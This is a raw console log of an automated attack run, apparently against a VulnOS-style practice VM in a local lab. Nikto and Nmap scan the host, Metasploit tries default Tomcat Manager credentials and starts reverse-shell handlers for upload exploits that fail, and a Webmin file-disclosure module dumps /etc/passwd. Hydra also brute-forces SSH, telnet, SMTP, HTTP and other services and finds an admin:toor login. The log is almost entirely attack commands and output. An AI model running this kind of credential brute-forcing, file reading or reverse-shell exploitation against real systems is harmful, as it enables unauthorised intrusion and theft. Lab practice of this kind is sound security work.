+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.141
++ Target Hostname:    192.168.1.141
++ Target Port:        8080
++ Start Time:         2015-12-28 11:24:23 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache-Coyote/1.1
++ Server leaks inodes via ETags, header found with file /, fields: 0xW/1887 0x1394395959000 
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ /: Appears to be a default Apache Tomcat install.
++ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
++ Cookie JSESSIONID created without the httponly flag
++ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
++ /manager/html: Default Tomcat Manager / Host Manager interface found
++ /docs/: Tomcat Documentation found
++ /manager/status: Default Tomcat Server Status interface found
++ 7839 requests: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2015-12-28 11:24:42 (GMT-5) (19 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 11:24 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00022s latency).
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
+                                                  
+Call trans opt: received. 2-19-98 13:24:18 REC:Loc
+
+     Trace program: running
+
+           wake up, Neo...
+        the matrix has you
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        (`.         ,-,
+                        ` `.    ,;' /
+                         `.  ,'/ .'
+                          `. X /.'
+                .-;--''--.._` ` (
+              .'            /   `
+             ,           ` '   Q '
+             ,         ,   `._    \
+          ,.|         '     `-.;_'
+          :  . `  ;    `  ` --,.._;
+           ' `    ,   )   .'
+              `._ ,  '   /_
+                 ; ,''-,;' ``-
+                  ``-..__``--`
+
+                             http://metasploit.pro
+
+
+Love leveraging credentials? Check out bruteforcing
+in Metasploit Pro -- learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.11.5-2015121501                   ]
++ -- --=[ 1518 exploits - 871 auxiliary - 256 post        ]
++ -- --=[ 436 payloads - 37 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+RHOST => 192.168.1.141
+RPORT => 8080
+RHOSTS => 192.168.1.141
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] Attempting to connect to 192.168.1.141:8080
+[+] No File(s) found
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] 192.168.1.141:8080  - /admin/j_security_check - Checking j_security_check...
+[*] 192.168.1.141:8080  - /admin/j_security_check - Server returned: 404
+[-] http://192.168.1.141:8080/admin/j_security_check - Unable to enumerate users with this URI
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: admin:admin (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: admin:manager (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: admin:role1 (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: admin:root (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: admin:tomcat (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: admin:s3cret (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: manager:admin (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: manager:manager (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: manager:role1 (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: manager:root (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: manager:tomcat (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: manager:s3cret (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: role1:admin (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: role1:manager (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: role1:role1 (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: role1:root (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: role1:tomcat (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: role1:s3cret (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: root:admin (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: root:manager (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: root:role1 (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: root:root (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: root:tomcat (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: root:s3cret (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: tomcat:admin (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: tomcat:manager (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: tomcat:role1 (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: tomcat:root (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: tomcat:tomcat (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: tomcat:s3cret (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: both:admin (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: both:manager (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: both:role1 (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: both:root (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: both:tomcat (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: both:s3cret (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: j2deployer:j2deployer (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: cxsdk:kdsxc (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: root:owaspbwa (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: ADMIN:ADMIN (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: xampp:xampp (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: tomcat:s3cret (Incorrect: )
+[-] 192.168.1.141:8080 TOMCAT_MGR - LOGIN FAILED: QCC:QLogic66 (Incorrect: )
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+[*] Started reverse handler on 192.168.1.149:4444 
+[*] Attempting to automatically select a target...
+[-] Failed: Error requesting /manager/serverinfo
+[-] Exploit aborted due to failure: no-target: Unable to automatically select a target
+[*] Exploit completed, but no session was created.
+[*] Started reverse handler on 192.168.1.149:4444 
+[*] 192.168.1.141:8080 - Retrieving session ID and CSRF token...
+[-] Exploit aborted due to failure: unknown: Unable to access the Tomcat Manager
+[*] Exploit completed, but no session was created.
++ -- --=[Port 8180 closed... skipping.
++ -- --=[Port 8443 closed... skipping.
++ -- --=[Port 10000 opened... running tests...
+                                                  
+     ,           ,
+    /             \
+   ((__---,,,---__))
+      (_) O O (_)_________
+         \ _ /            |\
+          o_o \   M S F   | \
+               \   _____  |  *
+                |||   WW|||
+                |||     |||
+
+
+Taking notes in notepad? Have Metasploit Pro track & report
+your progress and findings -- learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.11.5-2015121501                   ]
++ -- --=[ 1518 exploits - 871 auxiliary - 256 post        ]
++ -- --=[ 436 payloads - 37 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+RHOST => 192.168.1.141
+RHOSTS => 192.168.1.141
+[*] Attempting to retrieve /etc/passwd...
+[*] The server returned: 200 Document follows
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+landscape:x:102:108::/var/lib/landscape:/bin/false
+vulnosadmin:x:1000:1000:vulnosadmin,,,:/home/vulnosadmin:/bin/bash
+sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
+webmin:x:1002:1002::/home/webmin:/bin/sh
+hackme:x:1003:1003::/home/hackme:/bin/sh
+sa:x:1004:1004::/home/sa:/bin/sh
+stupiduser:x:1005:1005::/home/stupiduser:/bin/sh
+messagebus:x:103:112::/var/run/dbus:/bin/false
+distccd:x:104:65534::/:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+openldap:x:106:113:OpenLDAP Server Account,,,:/nonexistent:/bin/false
+ftp:x:1006:1006::/home/ftp:/bin/sh
+mysql:x:107:115:MySQL Server,,,:/var/lib/mysql:/bin/false
+telnetd:x:108:116::/nonexistent:/bin/false
+bind:x:109:117::/var/cache/bind:/bin/false
+postgres:x:110:118:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+postfix:x:111:119::/var/spool/postfix:/bin/false
+dovecot:x:112:121:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+tomcat6:x:113:122::/usr/share/tomcat6:/bin/false
+statd:x:114:65534::/var/lib/nfs:/bin/false
+snmp:x:115:123::/var/lib/snmp:/bin/false
+nagios:x:116:124::/var/lib/nagios:/bin/false
+openerp:x:117:125:Open ERP server,,,:/home/openerp:/bin/false
+[*] Auxiliary module execution completed
++ -- --=[Port 49152 closed... skipping.
+################################### Running Brute Force #############################
+#########################################################################################
+oooooo   oooo       .o.        .oooooo..o ooooo     ooo   .oooooo.
+   `888.   .8'       .888.      d8P'    `Y8 `888'     `8'  d8P'  `Y8b
+    `888. .8'       .88888.     Y88bo.       888       8  888      888
+     `888.8'       .8' `888.     `ZY8888o.   888       8  888      888
+      `888'       .88ooo8888.        `0Y88b  888       8  888      888
+       888       .8'     `888.  oo     .d8P  `88.    .8'  `88b    d88'
+      o888o     o88o     o8888o 88888888P'     `YbodP'     `Y8bood8P'
+Welcome to Yasuo v2.0
+Author: Saurabh Harit (@0xsauby) | Contribution & Coolness: Stephen Hall (@logicalsec)
+#########################################################################################
+
+I, [2015-12-28T11:25:04.873075 #13083]  INFO -- : Initiating port scan
+I, [2015-12-28T11:25:48.993761 #13083]  INFO -- : Using nmap scan output file nmap_output_20151228162504UTC.xml
+I, [2015-12-28T11:25:48.997918 #13083]  INFO -- : Discovered open port: 192.168.1.141:80
+I, [2015-12-28T11:25:49.003492 #13083]  INFO -- : Discovered tcpwrapped port: 192.168.1.141:514
+I, [2015-12-28T11:25:49.060103 #13083]  INFO -- : Discovered tcpwrapped port: 192.168.1.141:514
+I, [2015-12-28T11:25:49.136909 #13083]  INFO -- : Discovered open port: 192.168.1.141:901
+I, [2015-12-28T11:25:49.157647 #13083]  INFO -- : Discovered open port: 192.168.1.141:993
+I, [2015-12-28T11:25:49.197997 #13083]  INFO -- : Discovered open port: 192.168.1.141:995
+I, [2015-12-28T11:25:49.232813 #13083]  INFO -- : Discovered open port: 192.168.1.141:8080
+I, [2015-12-28T11:25:49.236134 #13083]  INFO -- : Discovered open port: 192.168.1.141:10000
+I, [2015-12-28T11:25:49.348989 #13083]  INFO -- : <<<Enumerating vulnerable applications>>>
+Yasuo found Apache Tomcat at http://192.168.1.141:8080/manager/html. Requires HTTP basic auth
+I, [2015-12-28T11:25:49.367083 #13083]  INFO -- : Initiating login bruteforce, hold on tight...
+Could not find default credentials, sucks
+Yasuo found phpMyAdmin at http://192.168.1.141:80/phpmyadmin/. May require form based auth
+I, [2015-12-28T11:26:12.085439 #13083]  INFO -- : Double-checking if the application implements a login page and initiating login bruteforce, hold on tight...
+Could not find default login credentials, sucks
+
+
+--------------------------------------------------------
+<<<Yasuo discovered following vulnerable applications>>>
+--------------------------------------------------------
++---------------+----------------------------------------+--------------------------------------------------+-----------+-----------+
+|   App Name    |           URL to Application           |                Potential Exploit                 | Username  | Password  |
++---------------+----------------------------------------+--------------------------------------------------+-----------+-----------+
+| Apache Tomcat | http://192.168.1.141:8080/manager/html | ./exploits/multi/http/tomcat_mgr_upload.rb       | Not Found | Not Found |
+| phpMyAdmin    | http://192.168.1.141:80/phpmyadmin/    | ./exploits/multi/http/phpmyadmin_preg_replace.rb | Not Found | Not Found |
++---------------+----------------------------------------+--------------------------------------------------+-----------+-----------+
+[3;J
+ __________                __         ____  ___
+ \______   \_______ __ ___/  |_  ____ \   \/  /
+  |    |  _/\_  __ \  |  \   __\/ __ \ \     / 
+  |    |   \ |  | \/  |  /|  | \  ___/ /     \ 
+  |______  / |__|  |____/ |__|  \___  >___/\  \ 
+         \/                         \/      \_/
+
+ + -- --=[BruteX v1.3 by 1N3
+ + -- --=[http://crowdshield.com
+
+
+################################### Running Port Scan ##############################
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2015-12-28 11:26 EST
+Nmap scan report for 192.168.1.141
+Host is up (0.00017s latency).
+Not shown: 10 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+23/tcp   open  telnet
+25/tcp   open  smtp
+53/tcp   open  domain
+80/tcp   open  http
+110/tcp  open  pop3
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+993/tcp  open  imaps
+3306/tcp open  mysql
+6667/tcp open  irc
+8080/tcp open  http-proxy
+MAC Address: 08:00:27:43:06:19 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
+
+################################### Running Brute Force ############################
+
+ + -- --=[Port 21 closed... skipping.
+ + -- --=[Port 22 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 11:26:36
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 30 tasks per 1 server, overall 64 tasks, 1333 login tries (l:31/p:43), ~0 tries per task
+[DATA] attacking service ssh on port 22
+[STATUS] 1461.00 tries/min, 1461 tries in 00:01h, 18446744073709551488 todo in 5124095576030431:01h, 30 active
+[STATUS] 487.00 tries/min, 1461 tries in 00:03h, 18446744073709551488 todo in 5124095576030431:01h, 30 active
+[STATUS] 208.71 tries/min, 1461 tries in 00:07h, 18446744073709551488 todo in 5124095576030430:60h, 30 active
+[STATUS] 97.40 tries/min, 1461 tries in 00:15h, 18446744073709551488 todo in 5124095576030430:59h, 30 active
+[STATUS] 47.13 tries/min, 1461 tries in 00:31h, 18446744073709551488 todo in 5124095576030430:58h, 30 active
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+ + -- --=[Port 23 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 12:00:00
+[WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 30 tasks per 1 server, overall 64 tasks, 1333 login tries (l:31/p:43), ~0 tries per task
+[DATA] attacking service telnet on port 23
+[STATUS] 405.00 tries/min, 405 tries in 00:01h, 928 todo in 00:03h, 30 active
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+ + -- --=[Port 25 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 12:02:04
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 30 tasks per 1 server, overall 64 tasks, 1333 login tries (l:31/p:43), ~0 tries per task
+[DATA] attacking service smtp-enum on port 25
+[25][smtp-enum] host: 192.168.1.141   login: backup
+[25][smtp-enum] host: 192.168.1.141   login: ftp
+[25][smtp-enum] host: 192.168.1.141   login: mail
+[25][smtp-enum] host: 192.168.1.141   login: mysql
+[25][smtp-enum] host: 192.168.1.141   login: nobody
+[25][smtp-enum] host: 192.168.1.141   login: postfix
+[25][smtp-enum] host: 192.168.1.141   login: postgres
+[25][smtp-enum] host: 192.168.1.141   login: root
+[25][smtp-enum] host: 192.168.1.141   login: sys
+[25][smtp-enum] host: 192.168.1.141   login: www-data
+1 of 1 target successfully completed, 10 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-12-28 12:02:36
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 12:02:37
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 30 tasks per 1 server, overall 64 tasks, 1333 login tries (l:31/p:43), ~0 tries per task
+[DATA] attacking service smtp on port 25
+[ERROR] SMTP LOGIN AUTH, either this auth is disabled
+or server is not using auth: 503 5.5.1 Error: authentication not enabled
+
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-12-28 12:02:38
+ + -- --=[Port 80 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 12:02:38
+[WARNING] http-head auth does not work with every server, better use http-get
+[DATA] max 30 tasks per 1 server, overall 64 tasks, 1333 login tries (l:31/p:43), ~0 tries per task
+[DATA] attacking service http-head on port 80
+[80][http-head] host: 192.168.1.141   login: admin   password: toor
+[STATUS] attack finished for 192.168.1.141 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-12-28 12:02:38
+ + -- --=[Port 110 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 12:02:38
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 30 tasks per 1 server, overall 64 tasks, 1333 login tries (l:31/p:43), ~0 tries per task
+[DATA] attacking service pop3 on port 110
+[ERROR] POP3 protocol or service shutdown: -ERR Plaintext authentication disallowed on non-secure (SSL/TLS) connections.
+
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-12-28 12:02:52
+ + -- --=[Port 139 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 12:02:52
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 64 tasks, 172 login tries (l:4/p:43), ~2 tries per task
+[DATA] attacking service smb on port 445 with SSL
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-12-28 12:03:01
+ + -- --=[Port 389 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 12:03:01
+[ERROR] you may only use one of -l, -L or -m
+
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 12:03:01
+[ERROR] you may only use one of -l, -L or -m
+
+ + -- --=[Port 443 closed... skipping.
+ + -- --=[Port 445 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 12:03:01
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 64 tasks, 172 login tries (l:4/p:43), ~2 tries per task
+[DATA] attacking service smb on port 445 with SSL
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-12-28 12:03:10
+ + -- --=[Port 512 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 12:03:10
+[DATA] max 30 tasks per 1 server, overall 64 tasks, 1333 login tries (l:31/p:43), ~0 tries per task
+[DATA] attacking service rexec on port 512 with SSL
+[ERROR] Child with pid 20152 terminating, can not connect
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+ + -- --=[Port 513 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 12:04:43
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 30 tasks per 1 server, overall 64 tasks, 1333 login tries (l:31/p:43), ~0 tries per task
+[DATA] attacking service rlogin on port 513 with SSL
+[ERROR] Child with pid 22165 terminating, can not connect
+[ERROR] Child with pid 22874 terminating, can not connect
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+ + -- --=[Port 514 closed... skipping.
+ + -- --=[Port 993 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 12:05:06
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 30 tasks per 1 server, overall 64 tasks, 1333 login tries (l:31/p:43), ~0 tries per task
+[DATA] attacking service imap on port 993 with SSL
+[STATUS] 1461.00 tries/min, 1461 tries in 00:01h, 18446744073709551488 todo in 5124095576030431:01h, 30 active
+[STATUS] 487.00 tries/min, 1461 tries in 00:03h, 18446744073709551488 todo in 5124095576030431:01h, 30 active
+[STATUS] 208.71 tries/min, 1461 tries in 00:07h, 18446744073709551488 todo in 5124095576030430:60h, 30 active
+[STATUS] 97.40 tries/min, 1461 tries in 00:15h, 18446744073709551488 todo in 5124095576030430:59h, 30 active
+[STATUS] 47.13 tries/min, 1461 tries in 00:31h, 18446744073709551488 todo in 5124095576030430:58h, 30 active
+[STATUS] 31.09 tries/min, 1461 tries in 00:47h, 18446744073709551488 todo in 5124095576030430:57h, 30 active
+[STATUS] 23.19 tries/min, 1461 tries in 01:03h, 18446744073709551488 todo in 5124095576030430:55h, 30 active
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+ + -- --=[Port 1433 closed... skipping.
+ + -- --=[Port 1521 closed... skipping.
+ + -- --=[Port 3306 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 13:22:15
+[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 4 tasks per 1 server, overall 64 tasks, 9 login tries, ~0 tries per task
+[DATA] attacking service mysql on port 3306
+[STATUS] attack finished for 192.168.1.141 (waiting for children to finish) ...
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-12-28 13:22:25
+ + -- --=[Port 3389 closed... skipping.
+ + -- --=[Port 5432 closed... skipping.
+ + -- --=[Port 5900 closed... skipping.
+ + -- --=[Port 5901 closed... skipping.
+ + -- --=[Port 8000 closed... skipping.
+ + -- --=[Port 8080 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 13:22:25
+[ERROR] The web page you supplied must start with a "/", "http://" or "https://", e.g. "/protected/login"
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 13:22:25
+[ERROR] module option must start with http://
+ + -- --=[Port 8100 closed... skipping.
+ + -- --=[Port 6667 opened... running tests...
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-12-28 13:22:25
+[DATA] max 30 tasks per 1 server, overall 64 tasks, 1333 login tries (l:31/p:43), ~0 tries per task
+[DATA] attacking service irc on port 6667
+[ERROR] should not be able to identify server msg, please report it
+:irc.localhost 020 * :Please wait while we process your connection.
+
+[ERROR] should not be able to identify server msg, please report it
+:irc.localhost 020 * :Please wait while we process your connection.
+
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+
+################################### Brute Forcing DNS ###############################
+dnsenum.pl VERSION:1.2.3
+
+-----   192.168.1.141   -----
+
+
+Host's addresses:
+__________________
+
+
+
+Name Servers:
+______________
+
+ 192.168.1.141 NS record query failed: NXDOMAIN
+
+################################### Done! ###########################################
+
+################################### Done! ###########################################
